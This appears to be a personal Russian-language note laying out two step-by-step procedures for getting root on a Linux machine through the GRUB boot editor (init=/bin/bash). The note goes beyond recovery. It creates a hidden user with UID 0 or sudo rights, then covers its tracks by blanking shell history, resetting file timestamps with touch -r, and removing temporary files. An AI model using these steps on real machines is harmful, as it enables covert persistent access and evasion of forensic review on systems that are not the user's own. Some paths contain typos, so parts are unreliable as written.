В грабе F2 F2
В конце строки пишем init=/bin/bash (По умолчанию запускается линукс, подменяем на bash)
mount -o remount, rw / (Монтируем корневую систему (по умолчанию на чтение) на чтение и запись)
HISTFILE="" (убираем логи)
Делаем резервную копию
	mktemp -d (Временная дирректория)
	 cd  ...
	 cp -p /etc/passwd .
	 cp -p /etc/shadow .
	 cp -p /etc/sudoers .
	 cp -p /etc/group .
	 cp -p /etc/gshadow .
Создаём юзера
/usr/sbin/useradd <имя_польователя>
passwd <имя_польователя>
password
password

(ls /home проверить пользователя)

mv /home/<имя_польователя> /tmp

nano /ets/passwd
меняем строку нашего пользователя
...x:0:0...

touch -r passwd /etc/passwd
touch -r shadow /etc/shadow
touch -r gshadow /etc/ghsdow
touch -r group /etc/group
touch -r sudoers /etc/sudoers
touch -r passwd /etc/home
touch -r passwd /home

ls -lat /home

ls /etc | grep home

rm /etc/home
ls /etc | grep home
whereis reboot

.../reboot -f

В консоле

HISTFILE=""
ls /tmp
rm -r /tmp/tmp....

su <имя_польщователя>
<пароль>



------------------Второй способ------------------
1. В GRUB выбрать способ загрузки (advanced options)
2. e - редактировать
3. linux ... quite splash добавляем init=/bin/bash
4. Ctrl+x / F10 - загрузиться
5. Должен появиться командная строка с #
6. mount -o remount,rw /    (чтение / запись)
7. HISTFILE=""    (чистим историю)
8. cp -p /etc/passwd /etc/passwd_backup              |
	 cp -p /etc/shadow /etc/shadow_backup            | резервные копии
	 cp -p /etc/sudoers /etc/sudoers_backup           |
	 cp -p /etc/group /etc/gruoup_backup                |    -p preserve attributes
	 cp -p /etc/gshadow /etc/gshadow_backup       |
9. adduser <ник>
10. passwd <ник>
11. visudo
	1. <ник> ALL=(ALL:ALL) ALL
12. mount -o remount,ro /
13. sync
14. Ctrl+Alt+PrtScreen+R   стандартный режим
15. Ctrl+Alt+PrtScreen+E   всем процессам
16. Ctrl+Alt+PrtScreen+I    убить
17. Ctrl+Alt+PrtScreen+S   синхронизировать
18. Ctrl+Alt+PrtScreen+U   перемонтировать на режим чтения
19. Ctrl+Alt+PrtScreen+B   перезагрузить
[[Полезные записки]]